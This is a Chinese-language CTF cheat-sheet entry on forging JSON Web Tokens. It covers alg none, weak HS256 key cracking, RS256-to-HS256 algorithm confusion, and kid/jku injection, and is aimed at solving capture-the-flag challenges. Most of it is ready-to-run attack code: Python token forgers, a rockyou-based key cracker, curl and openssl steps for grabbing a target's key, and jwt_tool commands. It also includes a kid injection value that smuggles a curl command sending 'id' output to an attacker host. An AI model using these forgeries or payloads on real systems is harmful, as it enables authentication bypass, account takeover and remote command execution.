---
title: JWT 伪造（none 算法 / 密钥爆破 / RS256→HS256）
category: web
tags: [jwt, 算法混淆, 密钥爆破, 认证绕过]
signals: [jwt token, eyJhbGciOi, cookie 里是 jwt, authorization bearer, alg none, 需要 admin 权限, 签名校验失败, 密钥是弱口令, jku kid]
difficulty: medium
source: "PortSwigger / PayloadsAllTheThings / jwt_tool"
tools: [jwt_tool, hashcat, python, pyjwt]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- Cookie 或 `Authorization: Bearer` 是 `xxx.yyy.zzz` 三段 base64url。
- 解码后 header 是 `{"alg":"HS256","typ":"JWT"}` 或 `{"alg":"RS256"}`。
- 题目让你"成为 admin"、"伪造身份"，但没给私钥。
- 报错里有 `Signature verification failed`、`InvalidAlgorithmError`。
- 变体：header 里有 `kid`、`jku`、`jwk` 字段。
- 关键词：jwt、token、签名、none、algorithm confusion。

## 二、原理

JWT = `base64url(header).base64url(payload).base64url(signature)`。

攻击面：
1. **`alg: none`**：把 header 改成 `{"alg":"none"}`，删除签名 → 部分库直接信任（旧版 PyJWT、jsonwebtoken）。
2. **HS256 弱密钥**：用字典爆破（`jwt_tool`/`hashcat -m 16500`）。
3. **RS256 → HS256 混淆**：服务端用公钥验证 RS256，但接受 HS256（把公钥当 HMAC 密钥）→ 用公钥作为 HMAC 密钥签名。
4. **`kid` 注入**：`kid` 被拼进文件路径/命令 → 路径穿越读文件或命令注入。
5. **`jku`/`x5u`**：指向自己的 JWKS 服务器，上传公钥 → 用自己私钥签。
6. **算法/解析差异**：`alg: "HS256"` vs `"hs256"`，大小写敏感库会产生绕过。

## 三、解题步骤

1. 解码 header/payload，判断算法。
2. `alg=none` 先试（一把梭）。
3. 弱密钥爆破（`jwt_tool -C` 或 hashcat）。
4. RS256：取公钥（可能从 `/jwks.json`、错误页、证书），转 PEM，用 HS256 密钥签名。
5. `kid`/`jku` 按情况做注入或托管。
6. 提交改后的 token。

## 四、可直接运行的脚本

纯 Python 实现（不依赖 pyjwt，手写 HMAC）：

```python
import base64, hmac, hashlib, json

def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64u_dec(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def forge_none(payload: dict) -> str:
    h = b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    p = b64u(json.dumps(payload).encode())
    return "%s.%s." % (h, p)          # 结尾空签名

def forge_hs256(payload: dict, key: bytes) -> str:
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    p = b64u(json.dumps(payload).encode())
    signing_input = ("%s.%s" % (h, p)).encode()
    sig = b64u(hmac.new(key, signing_input, hashlib.sha256).digest())
    return "%s.%s.%s" % (h, p, sig)

def forge_rs256_as_hs256(payload: dict, pubkey_pem: bytes) -> str:
    """RS256 公钥当 HMAC 密钥用（alg confusion）"""
    return forge_hs256(payload, pubkey_pem)

def decode(token: str):
    parts = token.split(".")
    return json.loads(b64u_dec(parts[0])), json.loads(b64u_dec(parts[1]))

# --- 自测 ---
if __name__ == "__main__":
    payload = {"user": "admin", "role": "admin"}
    print("none  :", forge_none(payload))
    print("hs256 :", forge_hs256(payload, b"secret"))
    h, p = decode(forge_hs256(payload, b"secret"))
    print("decoded:", h, p)
```

弱密钥爆破（Python 字典版，快且可中断）：

```python
import hmac, hashlib, base64

def crack_hs256(token, wordlist="rockyou.txt"):
    parts = token.split(".")
    signing_input = ("%s.%s" % (parts[0], parts[1])).encode()
    target = parts[2]
    for line in open(wordlist, "rb"):
        w = line.strip()
        sig = hmac.new(w, signing_input, hashlib.sha256).digest()
        if base64.urlsafe_b64encode(sig).rstrip(b"=").decode() == target:
            return w
    return None

# hashcat 更快：
# hashcat -a 0 -m 16500 token.txt rockyou.txt
```

RS256 混淆完整流程：

```bash
# 1. 拿公钥（常见位置）
curl -s "http://TARGET/jwks.json"
curl -s "http://TARGET/api/.well-known/jwks.json"
# 或用 openssl 从证书提取
openssl s_client -connect TARGET:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > pub.pem

# 2. 用公钥文件作为 HMAC 密钥伪造 HS256 token
python3 - <<'PY'
import hmac, hashlib, base64, json
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
key = open("pub.pem","rb").read()
h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
p = b64u(json.dumps({"user":"admin","role":"admin"}).encode())
s = hmac.new(key, ("%s.%s"%(h,p)).encode(), hashlib.sha256).digest()
print("%s.%s.%s" % (h, p, b64u(s)))
PY
```

`kid` 注入：

```python
import jwt   # pyjwt
# 1. kid 路径穿越读取 /dev/null（空文件）→ 空密钥签名
token = jwt.encode({"user": "admin"}, "", algorithm="HS256",
                   headers={"kid": "../../../../dev/null"})
# 2. kid 命令注入（服务端用 kid 拼执行命令时）
headers = {"kid": "/dev/null; curl http://VPS/$(id|base64);"}
```

jwt_tool 一条龙：

```bash
python3 jwt_tool.py <TOKEN> -M at -t "http://TARGET/api"   # 自动化攻击
python3 jwt_tool.py <TOKEN> -X a                            # alg none
python3 jwt_tool.py <TOKEN> -X k -pk pub.pem                # RS256->HS256
python3 jwt_tool.py <TOKEN> -C -d rockyou.txt               # 爆破
python3 jwt_tool.py <TOKEN> -I -hc kid -hv ../../dev/null   # kid 注入
```

## 五、常见坑 / 变体

- **`alg: none` 的库兼容**：新版 PyJWT 默认拒绝 `none`，但可以用 `alg: "None"`、`"nOnE"` 试大小写变体。
- **base64url 不带 `=` 填充**：手拼时注意 `rstrip("=")`。
- **HS256 密钥是公钥时**：公钥必须是**原始 DER** 还是 **PEM** 取决于服务端，两种都试。
- **jku/x5u 白名单**：常见白名单 `https://`，用 `https://VPS` 或 DNS rebinding。
- **payload 里的时间戳**：`exp`、`iat`、`nbf` 不合法会直接 401，改成未来时间。
- 变体：**空签名**（`alg: HS256` 但签名部分为空）在某些实现里通过。
- 变体：**`jwk` 头内嵌公钥**（CVE-2018-0114），服务端直接用你提供的公钥验证。
- 变体：**JWT 与 session 混用**：session cookie 优先级高，改 jwt 可能无效。

## 六、参考来源

- [PortSwigger Web Security Academy - JWT attacks](https://portswigger.net/web-security/jwt)
- [PayloadsAllTheThings - JSON Web Token](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [jwt_tool（ticarpi）](https://github.com/ticarpi/jwt_tool)
- [RFC 7519 - JSON Web Token](https://www.rfc-editor.org/rfc/rfc7519)
- [OWASP Top 10 2021 - A07:2021 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
